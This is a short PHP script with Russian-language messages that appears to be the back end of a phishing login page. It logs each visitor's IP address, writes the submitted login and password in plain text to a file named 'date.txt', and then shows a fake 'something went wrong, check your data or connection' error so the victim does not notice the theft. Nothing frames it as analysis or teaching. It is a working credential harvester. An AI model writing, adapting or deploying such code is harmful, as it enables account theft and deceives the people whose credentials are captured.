<?php

function getIp() {
	  $keys = [
	    'HTTP_CLIENT_IP',
	    'HTTP_X_FORWARDED_FOR',
	    'REMOTE_ADDR'
  	];
	  foreach ($keys as $key) {
	    if (!empty($_SERVER[$key])) {
	      $ip = trim(end(explode(',', $_SERVER[$key])));
	      if (filter_var($ip, FILTER_VALIDATE_IP)) {
	        return $ip;
	      }
	    }
	  }
	}

	$ip = getIP();

$file = fopen('date.txt', 'a');

fwrite($file, 'IP: ');
fwrite($file, $ip);
fwrite($file, "\n");

$login = $_POST ['login'];
$password = $_POST ['password'];

if (empty($password)) {
	echo "Вы забыли ввести пароль! ";
}

if (empty($login)) {
	echo "Вы забыли ввести логин! ";
}

else {
	$DateLoginPassword = fwrite($file, 'Логин: ');
						fwrite($file, $login);
						fwrite($file, "\n");
						fwrite($file, 'Пароль: ');
						fwrite($file, $password);
						fwrite($file, "\n");
						fwrite($file, '_______________');
						fwrite($file, "\n");
	echo 'Что-то пошло не так. Проверьте правильность введенных данных или проверьте подключение к интернету. В ином случае обратитесь в техподдержку';
}

?>